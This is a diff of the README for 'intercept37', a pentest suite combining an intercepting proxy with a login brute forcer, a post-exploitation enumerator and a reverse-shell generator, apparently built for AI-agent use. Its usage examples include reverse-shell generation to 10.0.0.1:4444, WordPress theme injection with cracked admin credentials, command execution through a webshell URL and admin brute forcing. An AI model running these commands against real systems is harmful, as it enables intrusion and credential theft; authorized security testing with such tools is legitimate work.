@@ -1,119 +1,203 @@
 # intercept37
 
-> Open-source intercepting proxy & pentest suite — built for humans and LLMs.
+> *"The ships hung in the sky in much the same way that bricks don't."*
+> *This proxy hangs in your traffic in much the same way that firewalls wish it wouldn't.*
 
-A free, open-source alternative to Burp Suite designed from the ground up with AI/LLM integration. Features an alien-themed web dashboard for human operators and structured API/MCP interfaces for AI-assisted penetration testing.
+An open-source intercepting proxy and pentest suite that speaks fluent JSON, explains itself when asked, and genuinely believes LLMs deserve nice APIs too.
 
-## Features
+Think Burp Suite, but free, with a terminal-friendly attitude and an alien aesthetic. Also, it brought friends — a brute forcer, a post-exploitation enumerator, and a reverse shell generator walked into a bar. The bartender said, "Is this a coordinated attack?" They said, "Only with authorization."
 
-### Intercepting Proxy
-- HTTP/HTTPS man-in-the-middle proxy (mitmproxy-based)
-- Real-time traffic capture & display via WebSocket
-- Full request/response inspection
+**Don't Panic.** There are four tools and they all have `--explain`.
 
-### Web Dashboard
-- Alien tech-themed dark UI with live traffic table
-- Request inspector with headers, body, syntax highlighting
-- Built-in repeater for crafting & replaying requests
-- Vulnerability scanner results with severity filtering
-- Dashboard stats with method distribution & host tracking
+---
 
-### Vulnerability Scanner
-- SQL Injection (error-based + time-based)
-- Cross-Site Scripting (XSS)
-- Command Injection
-- Path Traversal
-- SSRF (Server-Side Request Forgery)
-- Open Redirect
-- Security Header Analysis
+## The Arsenal
 
-### AI-Powered Analysis (Claude Integration)
-- Automated security analysis of captured requests
-- Plain English request explanations
-- Context-aware payload suggestions
-- Session-level pattern analysis
-- Automated pentest report generation
+### `intercept37` — The Mothership
+
+The intercepting proxy at the center of it all. Routes through port **8080**, serves a dashboard on port **1337** (obviously), and keeps track of everything that moves.
+
+- **Proxy** — mitmproxy-based MITM proxy with full request/response capture
+- **Dashboard** — React/Vite web UI, alien dark theme, live traffic via WebSocket
+- **Vuln Scanner** — SQLi, XSS, command injection, path traversal, SSRF, open redirect, security header analysis
+- **AI Agent** — Claude-powered with 16 tools for automated security analysis, payload suggestions, and report generation
+- **API** — REST endpoints for everything. Repeater, scanner, stats, LLM analysis. Your scripts will feel right at home
+
+```bash
+intercept37 start
+# Dashboard: http://localhost:1337
+# Proxy:     http://localhost:8080
+```
+
+### `breach37` — The Door Kicker
+
+*Replaces Hydra for web form attacks.* Async HTTP brute forcer that actually understands web apps.
+
+WordPress, Jenkins, Drupal — each has a preset that auto-configures login paths, form fields, failure detection, and CSRF handling. No more guessing parameter names from page source.
+
+Benchmarked at **2x Hydra's speed** on equivalent targets (72 req/s vs 34 req/s). Async concurrency turns out to be useful. Who knew.
+
+```bash
+# WordPress — just point and shoot
+breach37 wordpress --url http://target/blog/ --user admin
+
+# Jenkins
+breach37 jenkins --url http://target:8080/ --user admin
+
+# Custom form with failure detection
+breach37 http-form --url http://target/login \
+    --user admin --fail-string "Invalid credentials"
+
+# See all presets
+breach37 presets --human
+```
+
+### `recon37` — The Probe
+
+*Replaces LinPEAS.* Post-exploitation enumerator that works through whatever access you have — webshell, SSH, or local.
+
+Runs 42 enumeration commands across 8 categories: system info, users, SUID binaries, credentials, network, cron jobs, Docker, and writable paths. Cross-references findings against GTFOBins because you deserve nice things.
+
+```bash
+# Got a webshell? Use it
+recon37 enum --webshell "http://target/shell.php?cmd={cmd}"
+
+# SSH access
+recon37 enum --ssh user@target --password hunter2
+
+# Already on the box
+recon37 enum --local
+
+# Pick specific checks
+recon37 enum --local --checks suid,creds,docker --human
+```
+
+### `venom37` — The Payload Factory
+
+*Replaces msfvenom and revshells.com.* Generates reverse shells in 16 flavors with encoding options, listener commands, and WordPress theme injection.
+
+No more googling "bash reverse shell one-liner" and praying the quoting is right.
+
+```bash
+# Bash reverse shell with listener command
+venom37 gen bash 10.0.0.1 4444 --with-listener --human
+
+# PHP payload, base64 encoded for tight spaces
+venom37 gen php 10.0.0.1 4444 --encode base64
+
+# Inject into WordPress theme editor (got admin creds from breach37?)
+venom37 wp-inject -t http://target -u admin -p cracked123 \
+    --lhost 10.0.0.1 --lport 4444
+
+# What shells are available?
+venom37 list --human
+```
+
+---
+
+## LLM-First Design
+
+Every tool in the suite follows the same philosophy. You shouldn't need a wrapper script to make security tools talk to your AI agent.
+
+| Feature | What it means |
+|---------|---------------|
+| **JSON by default** | Structured output. Every tool. Always. Parse it, pipe it, feed it to Claude |
+| **`--human` flag** | Rich terminal output when a human is actually reading |
+| **`--explain` flag** | Describes exactly what the tool will do, then exits. No surprises |
+| **Teaching mode** | Results include context on *why* findings matter, not just *what* was found |
+| **Python importable** | `from intercept37.brute.engine import HttpBrute` — use them as libraries |
+| **Sane defaults** | Minimal required args. Presets handle the boring config |
+
+---
 
 ## Quick Start
 
 ```bash
-# Clone
+# Clone the transmission
 git clone https://github.com/russelljadams/intercept37.git
 cd intercept37
 
-# Install Python dependencies
+# Install (gets you all four tools)
 pip install -e .
 
 # Build the dashboard
 cd frontend && npm install && npm run build && cd ..
 
-# Set your Anthropic API key (optional, for AI features)
+# Optional: AI features need an API key
 export ANTHROPIC_API_KEY=your-key-here
 
-# Launch
+# Launch the mothership
 intercept37 start
 ```
 
-Then open http://localhost:1337 for the dashboard and configure your browser/tool to proxy through localhost:8080.
+Configure your browser or target tool to proxy through `localhost:8080`. Open `http://localhost:1337` for the dashboard. Start intercepting.
+
+The other tools work standalone — no proxy required:
+
+```bash
+breach37 wordpress --url http://target/ --user admin
+recon37 enum --webshell "http://target/cmd.php?c={cmd}"
+venom37 gen bash 10.0.0.1 4444 --with-listener
+```
+
+---
 
 ## Architecture
 
 ```
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  Web Dashboard   │◄──►│  FastAPI Backend   │◄──►│  Proxy Core      │
-│  (React/Vite)    │     │  REST + WebSocket  │     │  (mitmproxy)     │
-└─────────────────┘     └────────┬───────────┘     └─────────────────┘
-                                 │
-                    ┌────────────┼────────────┐
-                    │            │            │
-              ┌─────┴─────┐ ┌───┴────┐ ┌─────┴─────┐
-              │  Scanner   │ │  LLM   │ │  SQLite   │
-              │  Engine    │ │  Layer │ │  Storage  │
-              └───────────┘ └────────┘ └───────────┘
+                        ┌──────────────────────────┐
+                        │     intercept37           │
+                        │     The Mothership        │
+                        ├──────────────────────────┤
+┌──────────────┐        │                          │        ┌──────────────┐
+│  Dashboard   │◄──ws──►│  FastAPI                 │◄──────►│  Proxy Core  │
+│  React/Vite  │        │  REST + WebSocket        │        │  (mitmproxy) │
+│  :1337       │        │                          │        │  :8080       │
+└──────────────┘        └─────┬──────┬──────┬──────┘        └──────────────┘
+                              │      │      │
+                    ┌─────────┤      │      ├─────────┐
+                    │         │      │      │         │
+              ┌─────┴─────┐  │  ┌───┴────┐ │  ┌──────┴─────┐
+              │  Scanner   │  │  │  LLM   │ │  │  SQLite    │
+              │  Engine    │  │  │  Agent │ │  │  Storage   │
+              └───────────┘  │  │ 16 tools│ │  └────────────┘
+                             │  └────────┘ │
+        ┌────────────────────┼─────────────┼────────────────────┐
+        │                    │             │                    │
+  ┌─────┴─────┐        ┌────┴────┐   ┌────┴─────┐        ┌────┴────┐
+  │ breach37  │        │ recon37 │   │ venom37  │        │  Python │
+  │ Brute     │        │ Enum    │   │ Shells   │        │  API    │
+  │ Force     │        │ 42 cmds │   │ 16 types │        │  Import │
+  └───────────┘        └─────────┘   └──────────┘        └─────────┘
 ```
 
-## API Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/requests` | GET | List captured requests (filterable) |
-| `/api/requests/{id}` | GET | Get request details |
-| `/api/requests/{id}/repeat` | POST | Replay a request |
-| `/api/requests/send` | POST | Send a manual request |
-| `/api/stats` | GET | Dashboard statistics |
-| `/api/scanner/scan/{id}` | POST | Scan a specific request |
-| `/api/scanner/scan-all` | POST | Scan all unscanned requests |
-| `/api/scanner/scan-host` | POST | Scan requests by host |
-| `/api/scan-results` | GET | List scan results |
-| `/api/llm/analyze/{id}` | POST | AI security analysis |
-| `/api/llm/explain/{id}` | POST | Plain English explanation |
-| `/api/llm/suggest-payloads/{id}` | POST | AI payload suggestions |
-| `/api/llm/analyze-session` | POST | Session-level AI analysis |
-| `/api/llm/report` | POST | Generate pentest report |
-| `/ws` | WebSocket | Real-time traffic stream |
+---
 
 ## Tech Stack
 
-- **Python 3.11+** — Backend & proxy
-- **mitmproxy** — Proxy engine
-- **FastAPI** — REST API + WebSocket server
-- **SQLAlchemy + SQLite** — Traffic storage
-- **React + TypeScript + Vite** — Dashboard
-- **Tailwind CSS** — Alien-themed styling
-- **Anthropic Claude API** — AI analysis
+| Layer | Tech |
+|-------|------|
+| Proxy engine | mitmproxy |
+| API server | FastAPI + uvicorn |
+| Storage | SQLAlchemy + SQLite |
+| Dashboard | React + TypeScript + Vite + Tailwind |
+| HTTP client | httpx (async) |
+| CLI | Click |
+| AI | Anthropic Claude API |
+| Runtime | Python 3.11+ |
 
-## For LLMs / AI Agents
-
-intercept37 is designed to be driven programmatically. All functionality is accessible via REST API with JSON responses. Point your AI agent at the API endpoints above to:
-- Capture and analyze web traffic
-- Run automated vulnerability scans
-- Get AI-powered security insights
-- Generate pentest reports
+---
 
 ## License
 
-MIT
+MIT. Hack the planet (legally).
 
 ## Disclaimer
 
-This tool is intended for **authorized security testing only**. Always obtain proper authorization before testing any system you do not own.
+This is a security testing tool. It does exactly what it says on the tin: intercept traffic, brute force logins, enumerate systems, and generate reverse shells.
+
+**Use it only on systems you own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal in most jurisdictions and will ruin your day in ways that no reverse shell can fix.
+
+The authors are not responsible for misuse. The galaxy is already complicated enough.
+
+*Mess with the best, get authorized in writing like the rest.*
